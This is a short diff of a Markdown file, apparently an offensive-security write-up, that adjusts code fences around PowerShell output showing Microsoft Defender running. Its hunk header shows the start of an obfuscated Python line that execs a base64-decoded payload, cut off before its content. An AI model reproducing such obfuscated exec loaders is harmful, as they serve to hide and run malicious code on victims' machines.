@@ -55,9 +55,7 @@ exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW
 
 ```powershell
 PS C:\WINDOWS\system32> Get-service Windefend
-```
 Status   Name               DisplayName
 ------   ----               -----------
 Running  Windefend          Microsoft Defender Antivirus Service
-
 ```
